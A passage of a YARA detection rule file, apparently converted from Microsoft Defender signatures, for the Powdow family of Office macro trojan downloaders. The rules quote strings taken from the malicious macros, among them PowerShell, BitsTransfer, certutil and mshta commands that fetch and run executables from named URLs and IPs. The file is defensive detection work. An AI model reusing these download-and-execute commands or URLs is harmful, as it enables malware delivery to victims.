        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "-Source htt`ps://secur0.x24hr.com/a/ConsoleApp14.e`xe -Dest C:\\Users\\Public\\Documents\\returnother.e`xe" ascii //weight: 1
        $x_1_2 = "GetObject(Chr(110) & \"ew:13709620-C279-11CE-A49E-44455354000\" & CInt(0.3)).Open (driverisk)" ascii //weight: 1
        $x_1_3 = "C:\\Users\\Public\\Documents\\god.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVU_2147797595_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVU!MTB"
        threat_id = "2147797595"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 70 6f 77 5e 65 72 73 22 0d 0a [0-20] 3d 20 22 68 65 5e 6c 6c 22}  //weight: 1, accuracy: Low
        $x_1_2 = {47 65 74 4f 62 6a 65 63 74 28 43 68 72 28 31 31 30 29 20 26 20 22 65 77 3a 31 33 37 30 39 36 32 30 2d 43 32 37 39 2d 31 31 43 45 2d 41 34 39 45 2d 34 34 34 35 35 33 35 34 30 30 30 22 20 26 20 43 49 6e 74 28 30 2e 33 29 29 2e 4f 70 65 6e 20 28 [0-15] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2d 53 6f 75 72 63 65 20 68 74 74 [0-55] 2e 65 60 78 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-50] 2e 65 60 78 65}  //weight: 1, accuracy: Low
        $x_1_4 = "C:\\Users\\Public\\Documents\\god.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BSK_2147797815_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BSK!MTB"
        threat_id = "2147797815"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "text = Prefix1() + Prefix3() + Prefix2()" ascii //weight: 1
        $x_1_2 = {62 61 74 20 3d 20 22 [0-30] 2e 62 61 74 22}  //weight: 1, accuracy: Low
        $x_1_3 = "s = s + \"v\\llehSrewoPswodniW\\23metsyS\\swodniW\\:C\"" ascii //weight: 1
        $x_1_4 = "text = text +" ascii //weight: 1
        $x_1_5 = "s = \" cne- 1 niw- exe.llehsrewop\\0.1\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BTIS_2147798062_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BTIS!MTB"
        threat_id = "2147798062"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"C:\\Users\\Public\\Documents\\god.bat" ascii //weight: 1
        $x_1_2 = {2d 77 20 68 69 20 73 6c 5e 65 65 70 20 2d 53 65 20 33 31 3b 53 74 5e 61 5e 72 74 2d 42 69 74 73 54 72 5e 61 6e 73 5e 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 31 38 2e 31 35 36 2e 37 31 2e 32 33 37 2f 68 4e 2f 35 2f 42 2f [0-48] 2e 65 60 78 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-48] 2e 65 60 78 65}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"pow^ers" ascii //weight: 1
        $x_1_4 = "= \"he^ll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDX_2147798824_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDX!MTB"
        threat_id = "2147798824"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= sTemp & sBuf & vbCrLf" ascii //weight: 1
        $x_1_2 = "= Replace(\"87p87ow87e87r87s87h87e87l87l -w87i87n87d87ow87s87t87y87l87e h87i87dd87en 87I87nvo87ke87-W87ebR87e87qu87e87s87t h87t87t87ps:87//a87zg87energie87.f87r/wp-c87on87tent/up87l87o87ads87/287022/02/mo87npr87ogramme3.t87xt" ascii //weight: 1
        $x_1_3 = "= CreateObject(ActiveSheet.Range(\"A3\").Value)" ascii //weight: 1
        $x_1_4 = "= Environ(\"UserProfile\") & \"\\Office2021.bat\"" ascii //weight: 1
        $x_1_5 = ".Open (MonFichier1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_UNBT_2147805473_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.UNBT!MTB"
        threat_id = "2147805473"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub dasdaw()" ascii //weight: 1
        $x_1_2 = "myvalue.Run \"mshta https://bitly.com/asdqwderrtgrfsdafsfsdf\", 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVV_2147806385_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVV!MTB"
        threat_id = "2147806385"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"wscript.shell\").Run \"\"\"\" & Way$ & \"\"\"\"" ascii //weight: 1
        $x_1_2 = "linka$ = \"http://suknosepsa.temp.swtest.ru/RedCrab.exe\"" ascii //weight: 1
        $x_1_3 = "Way$ = \"C:\\temp\\RedCrab.exe\"" ascii //weight: 1
        $x_1_4 = ".Open \"GET\", Replace(URL$, \"\\\", \"/\"), \"False\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVW_2147807243_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVW!MTB"
        threat_id = "2147807243"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\").Run (\"powershell -nop -ep bypass -e \" + p)" ascii //weight: 1
        $x_1_2 = "p = p + \"SAAyACsAOABmAGIAbQAxAFYALwBlADcAYwA4AGYAVABqAFkAZg\"" ascii //weight: 1
        $x_1_3 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BSSK_2147807418_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BSSK!MTB"
        threat_id = "2147807418"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"C:\\Users\\Public\\dssdd.cmzd\"" ascii //weight: 1
        $x_1_2 = "= Replace(happenbuy, \".cmz\", \".cm\")" ascii //weight: 1
        $x_1_3 = "Dest C:\\Users\\Public\\Documents\\presidentlow.e`xe" ascii //weight: 1
        $x_1_4 = "= dogwater(0, \"open\", \"explorer\", happenbuy, \"\", 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BBSO_2147807655_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BBSO!MTB"
        threat_id = "2147807655"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 74 65 78 74 31 28 22 6b 65 79 77 6f 72 64 73 22 29 29 02 00 57 69 74 68 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 02 00 2e 53 61 76 65 41 73}  //weight: 1, accuracy: Low
        $x_1_2 = {54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 73 20 22 22 2c 20 [0-32] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = "GetObject(\"\", text1(\"category\")).exec StrReverse(\" rerolpxe\\swodniw\\:c\") + loadPowDoor" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVX_2147807721_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVX!MTB"
        threat_id = "2147807721"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "PID = Shell(\"wscript apihandler.js\", vbNormalFocus)" ascii //weight: 1
        $x_1_2 = "Range(\"GM2323\").Value & Range(\"GM2324\").Value & Range(\"GM2325\").Value" ascii //weight: 1
        $x_1_3 = {52 61 6e 67 65 28 22 47 4d 32 33 32 35 22 29 2e 56 61 6c 75 65 20 3d 20 22 22 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: High
        $x_1_4 = {53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 0d 0a 6d 61 63 68 69 6e 65}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PM_2147808124_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PM!MTB"
        threat_id = "2147808124"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"cmd.exe /C" ascii //weight: 1
        $x_1_2 = "= \"DownloadString('https://movetolight.xyz:443/disco" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"Wscript.Shell" ascii //weight: 1
        $x_1_4 = {2e 52 75 6e 20 28 [0-10] 20 2b 20 [0-10] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDC_2147808183_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDC!MTB"
        threat_id = "2147808183"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "lllllllllll.Open Chr(71) & Chr(69) & Chr(84), Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(52) & Chr(48) & Chr(46) & Chr(49) & Chr(49) & Chr(50) & Chr(46) & Chr(55) & _" ascii //weight: 1
        $x_1_2 = "Chr(49) & Chr(46) & Chr(50) & Chr(48) & Chr(51) & Chr(47) & Chr(118) & Chr(105) & Chr(114) & Chr(47) & Chr(102) & Chr(117) & Chr(100) & Chr(99) & Chr(97) & Chr(110) & Chr(46) & Chr(101) & Chr(120) & Chr(101), False" ascii //weight: 1
        $x_1_3 = ".write lllllllllll.responseBody" ascii //weight: 1
        $x_1_4 = "lllllllllll.Send" ascii //weight: 1
        $x_1_5 = "Shell (Chr(102) & Chr(105) & Chr(50) & Chr(108) & Chr(50) & Chr(101) & Chr(46) & Chr(101) & Chr(120) & Chr(101))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_BBK_2147808453_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.BBK!MTB"
        threat_id = "2147808453"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CallByName(UpFRK, \"Sh\" + \"el\" + \"lExe\" + \"cute\", VbMethod, tvet(0), tvet(1), tvet(2), tvet(3), tvet(4))" ascii //weight: 1
        $x_1_2 = "YIIPcawkM = brWWtI(g5, g6)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVY_2147808664_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVY!MTB"
        threat_id = "2147808664"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"WScript.Shell\").Run \"x.vbs\", 0, False" ascii //weight: 1
        $x_1_2 = {66 73 54 2e 57 72 69 74 65 54 65 78 74 20 28 47 65 74 48 54 4d 4c 53 6f 75 72 63 65 28 22 68 74 74 70 73 3a 2f 2f [0-40] 22 29 29 0d 0a 66 73 54 2e 53 61 76 65 54 6f 46 69 6c 65 20 22 78 2e 76 62 73 22}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 4d 53 58 4d 4c 32 2e 58 6d 6c 48 74 74 70 22 29 0d 0a 20 20 20 20 78 6d 6c 48 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 73 55 52 4c 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: High
        $x_1_4 = "Sub Auto_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVZ_2147808778_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVZ!MTB"
        threat_id = "2147808778"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 0d 0a 20 20 20 20 53 65 74 20 73 61 79 20 3d 20 77 73 68 2e 65 78 65 63 28 73 75 67 61 72 29 2e 73 74 64 6f 75 74}  //weight: 1, accuracy: High
        $x_1_2 = {3d 20 22 68 74 74 70 73 3a 2f 2f [0-30] 2f 52 53 41 5f 4b 45 59 2e 70 68 70 22 0d 0a 20 20 20 20 [0-6] 2e 4f 70 65 6e 20 22 50 4f 53 54 22 2c 20 [0-6] 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 0d 0a 20 20 20 20 78 4c 69 73 74 20 3d 20 41 72 72 61 79 28 22 69 70 63 6f 6e 66 69 67 20 2f 61 6c 6c 22 2c 20 22 6e 65 74 20 75 73 65 72 22 2c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDD_2147808855_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDD!MTB"
        threat_id = "2147808855"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=\"cne-1niw-e\"s=s+\"xe.llehsrewop\\0.1\"s=s+\"v\\llehsrewops\"s=s+\"wodniw\\23me\"s=s+\"tsys\\swodniw\\:c\"x=strreverse(s)" ascii //weight: 1
        $x_1_2 = "x=x+\"st\"x=x+\"art\"x=x+\"/m\"x=x+\"i\"+\"n\"prefix1=xendfunction" ascii //weight: 1
        $x_1_3 = "=shell(bat,0)endsubprivatesub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAA_2147808862_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAA!MTB"
        threat_id = "2147808862"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a [0-20] 20 3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 64 73 73 64 64 2e 63 6d 7a 64 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 22 68 65 6c 6c 22 0d 0a [0-20] 20 3d 20 52 65 70 6c 61 63 65 28 [0-20] 2c 20 22 2e 63 6d 7a 22 2c 20 22 2e 63 6d 22 29 0d 0a [0-20] 20 3d 20 22 70 6f 77 65 72 73 5e 22}  //weight: 1, accuracy: Low
        $x_1_3 = {50 72 69 6e 74 20 23 33 2c 20 [0-20] 20 26 20 [0-20] 20 26 20 22 20 2d 77 20 68 69 20 73 5e 6c 65 65 70 20 2d 53 65 20 33 31 3b 53 74 61 72 74 2d 42 69 74 73 54 72 5e 61 6e 5e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70}  //weight: 1, accuracy: Low
        $x_1_4 = {64 6f 67 65 28 30 2c 20 53 74 72 43 6f 6e 76 28 22 6f 70 65 6e 22 2c 20 36 34 29 2c 20 53 74 72 43 6f 6e 76 28 22 65 78 70 6c 6f 72 65 72 22 2c 20 36 34 29 2c 20 53 74 72 43 6f 6e 76 28 [0-20] 2c 20 36 34 29 2c 20 22 22 2c 20 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAC_2147809072_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAC!MTB"
        threat_id = "2147809072"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FileUrl = \"http://www.bookiq.bsnl.co.in/data_entry/circulars/mmaaccc.exe\"" ascii //weight: 1
        $x_1_2 = "Shell (\"file1.exe\")" ascii //weight: 1
        $x_1_3 = "Environ(\"appdata\") & \"\\Microsoft\\Templates\\\" & DateDiff(\"s\", #1/1/1970#, Now()) & \".dotm\"" ascii //weight: 1
        $x_1_4 = "objStream.SaveToFile \"file1.exe\", 2" ascii //weight: 1
        $x_1_5 = {61 75 74 6f 6f 70 65 6e 28 29 0d 0a 20 20 20 20 63 75 72 66 69 6c 65 20 3d 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 50 61 74 68 20 26 20 22 5c 22 20 26 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 4e 61 6d 65}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAD_2147809381_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAD!MTB"
        threat_id = "2147809381"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CallByName(sSVno, RijxuydD(\" S h e l l E x e c u t e \"), VbMethod, DGjG" ascii //weight: 1
        $x_1_2 = "RijxuydD(\"S h e l l . A p p l i c a t i o n\")" ascii //weight: 1
        $x_1_3 = "DGjG(0) = \"p\" + ifgkdfg" ascii //weight: 1
        $x_1_4 = {67 35 20 3d 20 43 65 6c 6c 73 28 32 2c 20 37 29 0d 0a 67 36 20 3d 20 43 65 6c 6c 73 28 33 2c 20 37 29}  //weight: 1, accuracy: High
        $x_1_5 = "char = Mid(wjkwer, i, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDG_2147809519_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDG!MTB"
        threat_id = "2147809519"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://doxiting.co.za/wp/wp-content/uploads/FULLFORCE.exe\"\" " ascii //weight: 1
        $x_1_2 = "&& Pqdahiskothlvp.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDG_2147809519_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDG!MTB"
        threat_id = "2147809519"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=vba.replace(\"mshki\",\"ki\",\"ta\")" ascii //weight: 1
        $x_1_2 = "=\"http://j.mp/\"chu=fee+kki+aksdendfunctionpublicfunctionlnk()" ascii //weight: 1
        $x_1_3 = "publicfunctionta()vba.beepvba.beepcreateobject(\"wscript.shell\").execchu+lnkendfunction" ascii //weight: 1
        $x_1_4 = "debug.printmsgbox(\"re-installoffice\",vbokcancel);returns;1debug.printmeggggga.taendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVAE_2147809574_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVAE!MTB"
        threat_id = "2147809574"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2d 77 20 68 69 20 [0-255] 20 2d 53 6f 75 72 20 68 74 74 60 70 [0-159] 2e 65 60 78 65 20 2d 44 65 73 74 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-159] 2e 65 60 78 65 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 02 2e 65 60 78 65}  //weight: 1, accuracy: Low
        $x_1_2 = {66 73 20 3d 20 64 6f 67 65 28 30 2c 20 53 74 72 43 6f 6e 76 28 22 6f 70 65 6e 22 2c 20 36 34 29 2c 20 53 74 72 43 6f 6e 76 28 22 65 78 70 6c 6f 72 65 72 22 2c 20 36 34 29 2c 20 53 74 72 43 6f 6e 76 28 [0-20] 2c 20 36 34 29 2c 20 22 22 2c 20 31 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PDI_2147810486_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PDI!MTB"
        threat_id = "2147810486"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "MsgBox \"ERrOR!\"" ascii //weight: 1
        $x_1_2 = "= \"C:\\Users\\\" & Environ(\"UserName\") & \"\\Pictures\\notnice\" + \".\" + \"ps1\"" ascii //weight: 1
        $x_1_3 = "GetObject(\"new:13709620-C279-11CE-A49E-444553540000\").Shellexecute asdasodkoaskdok.lcaksdokasodkaoskd.Tag, askdoaksodkaosdk.asdokasodkasodk.Tag + kaoskdokasd," ascii //weight: 1
        $x_1_4 = "StrReverse(\"n\" + \"e\" + \"p\" + \"o\"), _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_LOR_2147810700_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.LOR!MTB"
        threat_id = "2147810700"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Debug.Assert (VBA.Shell(lol))" ascii //weight: 1
